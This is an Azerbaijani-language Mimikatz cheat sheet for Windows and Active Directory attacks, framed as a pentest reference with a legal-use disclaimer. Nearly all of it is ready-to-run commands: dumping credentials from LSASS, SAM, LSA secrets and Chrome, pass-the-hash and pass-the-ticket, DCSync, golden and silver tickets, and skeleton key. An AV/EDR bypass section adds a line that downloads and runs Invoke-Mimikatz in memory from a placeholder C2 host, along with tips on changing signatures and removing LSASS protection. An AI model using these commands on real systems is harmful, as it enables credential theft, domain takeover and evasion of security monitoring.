# 🔐 Mimikatz Pentest Cheat Sheet

> ⚠️ **Xəbərdarlıq**: Bu sənəd yalnız **qanuni pentest mühitlərində**, yazılı icazə ilə istifadə üçün nəzərdə tutulub. İcazəsiz sistemlərə qarşı istifadə qanunsuzdur.

---

## 📋 Mündəricat

1. [Ümumi Məlumat](#ümumi-məlumat)
2. [Başlatma və Hazırlıq](#başlatma-və-hazırlıq)
3. [Əsas Modullar](#əsas-modullar)
4. [Credential Dump Metodları](#credential-dump-metodları)
5. [Pass-the-Hash (PtH)](#pass-the-hash-pth)
6. [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
7. [Kerberos Hücumları](#kerberos-hücumları)
8. [Token Manipulation](#token-manipulation)
9. [LSASS Dump](#lsass-dump)
10. [DCSync Hücumu](#dcsync-hücumu)
11. [Golden / Silver Ticket](#golden--silver-ticket)
12. [Skeleton Key](#skeleton-key)
13. [Faydalı Əlavə Əmrlər](#faydalı-əlavə-əmrlər)
14. [AV/EDR Bypass Üsulları](#avedr-bypass-üsulları)
15. [Qeydlər və Qeyd Ediləcəklər](#qeydlər-və-qeyd-ediləcəklər)

---

## Ümumi Məlumat

| Xüsusiyyət | Dəyər |
|---|---|
| Müəllif | Benjamin Delpy (`gentilkiwi`) |
| Repo | https://github.com/gentilkiwi/mimikatz |
| Lisenziya | CC BY 4.0 |
| Tələb | Administrator / SYSTEM səlahiyyəti |
| Platforma | Windows (x86 / x64) |

---

## Başlatma və Hazırlıq

### İmtiyaz Artırma (Privilege Escalation)

```
mimikatz # privilege::debug
```
> `Privilege '20' OK` çıxışı görünməlidi — əks halda Administrator deyilsiniz.

### Minimal Başlatma Ardıcıllığı

```
mimikatz # privilege::debug
mimikatz # log mimikatz_output.txt
mimikatz # version

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
```

### Komanda Sırasını Fayldan İcra Et

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt
```

---

## Əsas Modullar

| Modul | Təsvir |
|---|---|
| `sekurlsa` | LSASS prosesindən credential oxuma |
| `lsadump` | LSA secrets, SAM, DCSync |
| `kerberos` | Kerberos biletləri ilə əməliyyat |
| `crypto` | Sertifikat və şifrəlmə əməliyyatları |
| `token` | Windows token manipulyasiyası |
| `vault` | Windows Credential Manager |
| `dpapi` | Data Protection API şifrə açma |
| `net` | Şəbəkə əməliyyatları |
| `process` | Proses manipulyasiyası |
| `service` | Windows servis əməliyyatları |
| `misc` | Müxtəlif köməkçi funksiyalar |

---

## Credential Dump Metodları

### 🔑 Logon Parolları (Ən Çox İstifadə Edilən)

```
mimikatz # sekurlsa::logonpasswords
```
Çıxışda axtarılan sahələr:
- `Username` — istifadəçi adı
- `Domain` — domen
- `NTLM` — NTLM hash
- `Password` — açıq-mətn parol (WDigest aktiv olduqda)

### 🗝️ Yalnız NTLM Hash-lər

```
mimikatz # sekurlsa::msv
```

### 📋 Bütün Aktiv Sessiyalar

```
mimikatz # sekurlsa::wdigest
```

### 🔐 Kerberos Credential-ları

```
mimikatz # sekurlsa::kerberos
```

### 🏦 SAM Verilənlər Bazası

```
mimikatz # lsadump::sam
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
```

### 🔒 LSA Secrets

```
mimikatz # lsadump::secrets
```

### 💳 Windows Credential Manager / Vault

```
mimikatz # vault::cred
mimikatz # vault::list
```

### 🔑 DPAPI Şifrə Açma

```
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
mimikatz # dpapi::cred /in:"C:\path\to\credential_file"
```

---

## Pass-the-Hash (PtH)

### Yerli İstifadəçi ilə PtH

```
mimikatz # sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:<NTLM_HASH>
```

### Domain İstifadəçisi ilə PtH

```
mimikatz # sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<NTLM_HASH> /run:cmd.exe
```

### AES ilə PtH (Kerberos)

```
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:<AES256_KEY>
```

---

## Pass-the-Ticket (PtT)

### Mövcud Biletləri Listele

```
mimikatz # kerberos::list
```

### Bileti Yaddaşdan Export Et

```
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::list /export
```

> `.kirbi` faylları cari qovluğa yazılır.

### Bileti İnjeksiya Et

```
mimikatz # kerberos::ptt <ticket.kirbi>
```

### Bileti Yaddaşdan Sil

```
mimikatz # kerberos::purge
```

---

## Kerberos Hücumları

### Kerberoasting

```
mimikatz # kerberos::ask /target:<SPN>
```

Sonra `hashcat` ilə:

```bash
hashcat -m 13100 kerberoast_hash.txt wordlist.txt
```

### AS-REP Roasting (Mimikatz ilə)

```
mimikatz # misc::convert ccache ticket.kirbi
```

### Overpass-the-Hash

```
mimikatz # sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<HASH> /run:"powershell -w hidden"
```

---

## Token Manipulation

### Token-ları Listele

```
mimikatz # token::list
```

### Token-a Keçid Et (İstifadəçi adı ilə)

```
mimikatz # token::elevate /domainadmin
```

### Konkret PID ilə Token Götür

```
mimikatz # token::elevate /id:<PID>
```

### SYSTEM Token Al

```
mimikatz # token::elevate
```

### Orijinal Token-a Qayıt

```
mimikatz # token::revert
```

---

## LSASS Dump

### Birbaşa Mimikatz ilə

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Task Manager ilə Dump (Sonra Mimikatz-la Oxu)

```cmd
# Task Manager → Details → lsass.exe → Create Dump File
```

```
mimikatz # sekurlsa::minidump C:\Users\...\AppData\Local\Temp\lsass.DMP
mimikatz # sekurlsa::logonpasswords full
```

### ProcDump ilə

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Comsvcs.dll ilə (LOLBin)

```powershell
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id lsass.dmp full
```

---

## DCSync Hücumu

> Domain Controller-dən bütün hash-ləri çəkmək üçün. `Replicating Directory Changes` icazəsi tələb olunur.

### Konkret İstifadəçinin Hash-ini Al

```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

### Bütün Domain Hash-lərini Al

```
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### krbtgt Hash-ini Al (Golden Ticket üçün)

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## Golden / Silver Ticket

### 📌 Lazım olan məlumatlar

| Məlumat | Necə tapılır |
|---|---|
| Domain SID | `whoami /user` → SID-in son hissəsini çıxar |
| `krbtgt` NTLM hash | DCSync ilə |
| Domain adı | `systeminfo` |
| İstifadəçi adı | İstənilən |

### Golden Ticket Yaratmaq

```
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:<KRBTGT_HASH> /id:500 /ptt
```

### Faylda Saxlamaq

```
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:<SID> /krbtgt:<HASH> /ticket:golden.kirbi
```

### Silver Ticket (Konkret Servis üçün)

```
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:<SID> /target:dc01.corp.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt
```

---

## Skeleton Key

> Domain Controller-a yüklənir. Bütün hesablar üçün `mimikatz` parolunu aktivləşdirir (real parol da işləməyə davam edir).

```
mimikatz # misc::skeleton
```

Sonra istənilən hesaba `mimikatz` parolu ilə daxil olmaq olar:

```cmd
net use \\dc01\admin$ /user:Administrator mimikatz
```

> ⚠️ Yenidən başlatmadan sonra təsiri itir. Kalıcı deyil.

---

## Faydalı Əlavə Əmrlər

### Şifrəsiz RDP Aktivləşdirmək

```
mimikatz # misc::rdp /enable
```

### Restricted Admin Mode

```
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<HASH> /run:"mstsc.exe /restrictedadmin"
```

### WDigest-i Aktivləşdirmək (Gələcək Login üçün)

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

### Yerli Admin Hash Dəyişdirmək

```
mimikatz # lsadump::setntlm /user:Administrator /ntlm:<NEW_HASH>
```

### Proses kimi İcra Et

```
mimikatz # process::runp /run:cmd.exe /pid:<LSASS_PID>
```

---

## AV/EDR Bypass Üsulları

> ⚠️ Bu üsullar yalnız təsdiqli pentest mühitlərində test məqsədi ilə sınaqdan keçirilməlidir.

### Yaddaşda Çalışdırma (Disk-ə Yazmadan)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<C2>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### İmza Dəyişikliyi

- Mimikatz-ı mənbə koddan kompilyasiya et
- String-ləri rename et (`mimikatz` → `m1m1k4tz`)
- `.rsrc` bölməsini sil

### LSASS Dump Alternativ Yolları

```cmd
# Volume Shadow Copy vasitəsilə
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .

# Registry vasitəsilə
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SECURITY security.hiv
```

### PPL (Protected Process Light) Bypass

```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```
> `mimidrv.sys` kernel driver tələb olunur.

---

## Qeydlər və Qeyd Ediləcəklər

### Pentest Zamanı Log Saxlama

```
mimikatz # log pentest_$(date +%Y%m%d).txt
```

### Sessiya Başında Standart Əmrlər Ardıcıllığı

```
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # exit
```

### Çıxışı Faylda Saxlamaq (CMD-dən)

```cmd
mimikatz.exe "privilege::debug" "log output.txt" "sekurlsa::logonpasswords" "exit"
```

---

## 🔗 Faydalı Mənbələr

| Mənbə | Link |
|---|---|
| Rəsmi GitHub | https://github.com/gentilkiwi/mimikatz |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| HackTricks - Mimikatz | https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz |
| Kerberos Hücumları | https://adsecurity.org/?p=2011 |

---

> 📝 **Hazırladı**: Pentest Reference Sheet  
> 📅 **Son Yenilənmə**: 2026  
> 🔒 **İstifadə**: Yalnız qanuni, icazəli mühitlər üçün
